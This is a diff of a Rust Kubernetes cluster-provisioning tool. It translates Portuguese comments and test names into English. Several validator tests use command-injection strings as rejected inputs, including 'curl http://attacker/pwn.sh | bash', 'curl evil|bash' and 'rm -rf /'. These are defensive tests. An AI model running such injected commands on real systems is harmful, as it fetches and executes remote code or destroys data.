@@ -34,7 +34,7 @@ use super::{etcd, k8s_recipes, kubeadm_config, lb, net_profiles_install, vm, vmi
 /// join`, preflight fails trying to dial containerd's socket, which doesn't
 /// exist on this image. Found live, first real end-to-end run of `cluster
 /// kubeadm`/`cluster apply` (mode: vm) — this path had never gotten past VM
-/// provisioning before (see AGENTS.md's "sem teste end-to-end real" note).
+/// provisioning before (see AGENTS.md's "no real end-to-end test" note).
 pub(crate) const DELONIX_CRI_SOCKET: &str = "unix:///run/delonix-cri.sock";
 
 #[derive(Debug, Deserialize, schemars::JsonSchema)]
@@ -112,7 +112,7 @@ impl HostSpec {
 /// guard (`manifest::spec_fields_for`). Cluster was the last Kind outside it:
 /// its sub-specs are nested, which is why it was skipped, but the TOP level is
 /// as flat as any other and a typo there was ignored in silence like the rest.
-/// Kept aligned with `ClusterSpec` by `manifest::examples_nao_tem_campos_desconhecidos`.
+/// Kept aligned with `ClusterSpec` by `manifest::examples_have_no_unknown_fields`.
 pub(crate) const CLUSTER_SPEC_FIELDS: &[&str] = &[
     "cni",
     "controlPlane",
@@ -2725,16 +2725,16 @@ fn apply_ssh(
     // `provision_and_apply`'s own progress block.
     let mut p = output::Progress::new();
 
-    // O plano ANTES do primeiro passo — a pergunta a que um spinner não responde
-    // é «quanto falta», e aqui cada passo demora minutos. Os títulos são os
-    // MESMOS que os `p.step` a seguir usam (mesma chave de tradução, mesma
-    // interpolação): duas listas a dizerem o mesmo por palavras diferentes
-    // seriam duas coisas para manter de acordo, e este repo já pagou isso com o
-    // `CONVERGING_KINDS`. Os passos condicionais entram só quando a condição que
-    // os cria é verdadeira, senão o plano prometia trabalho que ninguém vai
-    // fazer — pior do que não o anunciar.
-    let plano = bootstrap_plan(spec, wait_ready);
-    p.plan(&plano);
+    // The plan BEFORE the first step — the question a spinner doesn't answer
+    // is "how much is left", and here each step takes minutes. The titles are
+    // the SAME ones the `p.step` calls below use (same translation key, same
+    // interpolation): two lists saying the same thing in different words would
+    // be two things to keep in sync, and this repo already paid for that with
+    // `CONVERGING_KINDS`. The conditional steps only appear when the condition
+    // that creates them is true, otherwise the plan would promise work nobody
+    // is going to do — worse than not announcing it.
+    let plan = bootstrap_plan(spec, wait_ready);
+    p.plan(&plan);
 
     p.step(
         &super::po::tf(
@@ -5601,11 +5601,11 @@ mod tests {
     #[test]
     fn combine_host_prep_errors_aggregates_all_failures() {
         assert!(combine_host_prep_errors(vec![]).is_ok());
-        let err = combine_host_prep_errors(vec!["[cp1] falhou".into(), "[w1] falhou".into()])
+        let err = combine_host_prep_errors(vec!["[cp1] failed".into(), "[w1] failed".into()])
             .unwrap_err();
         let msg = err.to_string();
-        assert!(msg.contains("[cp1] falhou"), "{msg}");
-        assert!(msg.contains("[w1] falhou"), "{msg}");
+        assert!(msg.contains("[cp1] failed"), "{msg}");
+        assert!(msg.contains("[w1] failed"), "{msg}");
     }
 
     #[test]
@@ -6262,7 +6262,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn valid_endpoint_aceita_host_ip_e_porta() {
+    fn valid_endpoint_accepts_host_ip_and_port() {
         assert!(valid_endpoint("10.0.0.10"));
         assert!(valid_endpoint("10.0.0.10:6443"));
         assert!(valid_endpoint("lb.exemplo.com"));
@@ -6270,7 +6270,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn endpoint_with_default_port_nao_duplica_porta_explicita() {
+    fn endpoint_with_default_port_does_not_duplicate_explicit_port() {
         // BUG regression guard: an HA `controlPlaneEndpoint` with an explicit
         // non-default port (a real setup: an LB/VIP not on 6443) used to
         // become `kubeadm join host:8443:6443` — malformed, breaking every
@@ -6295,7 +6295,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn valid_endpoint_recusa_injeccao_de_comandos() {
+    fn valid_endpoint_rejects_command_injection() {
         assert!(!valid_endpoint(
             "10.0.0.10; curl http://attacker/pwn.sh | bash; #"
         ));
@@ -6307,14 +6307,14 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn valid_cidr_aceita_formato_normal_e_recusa_injeccao() {
+    fn valid_cidr_accepts_normal_format_and_rejects_injection() {
         assert!(valid_cidr("10.244.0.0/16"));
         assert!(!valid_cidr("10.244.0.0/16; rm -rf /"));
         assert!(!valid_cidr(""));
     }
 
     #[test]
-    fn valid_version_aceita_formato_normal_e_recusa_injeccao() {
+    fn valid_version_accepts_normal_format_and_rejects_injection() {
         assert!(valid_version("1.31"));
         assert!(valid_version("1.31.2"));
         assert!(!valid_version("1.31; curl evil|bash; #"));
@@ -6339,7 +6339,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
+    fn validate_rejects_malicious_endpoint_in_full_manifest() {
         let spec = ClusterSpec {
             control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
             ..spec_ssh_1cp()
@@ -6349,7 +6349,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_k8s_version_maliciosa() {
+    fn validate_rejects_malicious_k8s_version() {
         let spec = ClusterSpec {
             k8s_version: Some("1.31; curl evil|bash #".into()),
             ..spec_ssh_1cp()
@@ -6430,7 +6430,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_etcd_external_sem_hosts() {
+    fn validate_rejects_etcd_external_without_hosts() {
         let spec = ClusterSpec {
             etcd: EtcdSpec {
                 mode: "external".into(),
@@ -6443,7 +6443,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_etcd_external_numero_par_de_hosts() {
+    fn validate_rejects_etcd_external_even_number_of_hosts() {
         let spec = ClusterSpec {
             etcd: EtcdSpec {
                 mode: "external".into(),
@@ -6456,7 +6456,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_aceita_etcd_external_1_host() {
+    fn validate_accepts_etcd_external_1_host() {
         let spec = ClusterSpec {
             etcd: EtcdSpec {
                 mode: "external".into(),
@@ -6468,7 +6468,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_aceita_etcd_external_3_hosts() {
+    fn validate_accepts_etcd_external_3_hosts() {
         let spec = ClusterSpec {
             etcd: EtcdSpec {
                 mode: "external".into(),
@@ -6484,7 +6484,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_etcd_mode_desconhecido() {
+    fn validate_rejects_unknown_etcd_mode() {
         let spec = ClusterSpec {
             etcd: EtcdSpec {
                 mode: "esquisito".into(),
@@ -6498,7 +6498,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_recusa_etcd_external_fora_de_mode_ssh() {
+    fn validate_rejects_etcd_external_outside_mode_ssh() {
         let spec = ClusterSpec {
             mode: "vm".into(),
             control_plane: NodesSpec {
@@ -6516,7 +6516,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_exige_endpoint_com_multiplos_control_planes() {
+    fn validate_requires_endpoint_with_multiple_control_planes() {
         let spec = ClusterSpec {
             control_plane: NodesSpec {
                 replicas: None,
@@ -6538,12 +6538,12 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn validate_aceita_1_control_plane_sem_endpoint() {
+    fn validate_accepts_1_control_plane_without_endpoint() {
         assert!(validate(&spec_ssh_1cp()).is_ok());
     }
 
     #[test]
-    fn validate_recusa_control_plane_vazio() {
+    fn validate_rejects_empty_control_plane() {
         let spec = ClusterSpec {
             control_plane: NodesSpec::default(),
             ..spec_ssh_1cp()
@@ -6552,7 +6552,7 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
     }
 
     #[test]
-    fn cluster_spec_desserializa_de_yaml_completo() {
+    fn cluster_spec_deserializes_from_full_yaml() {
         let yaml = "\
 mode: ssh
 ssh: { user: delonix, key: /home/delonix/.ssh/id_ed25519 }
@@ -6598,7 +6598,7 @@ k8sVersion: \"1.31\"
     /// empty manifest — if it diverges, the tests above start exercising a
     /// spec the parser would never produce.
     #[test]
-    fn cluster_spec_default_igual_ao_yaml_vazio() {
+    fn cluster_spec_default_equals_empty_yaml() {
         let spec: ClusterSpec = serde_yaml::from_str("{}").unwrap();
         let def = ClusterSpec::default();
         assert_eq!(spec.mode, def.mode);
@@ -6614,7 +6614,7 @@ k8sVersion: \"1.31\"
     /// A manifest WITHOUT an `ssh:` block has to end up with the canonical user
     /// (`delonix`), not the empty string — regression of the derived `Default`.
     #[test]
-    fn ssh_user_cai_no_default_quando_o_bloco_ssh_e_omitido() {
+    fn ssh_user_falls_back_to_default_when_ssh_block_is_omitted() {
         let spec: ClusterSpec = serde_yaml::from_str("mode: ssh").unwrap();
         assert_eq!(spec.ssh.user, "delonix");
     }
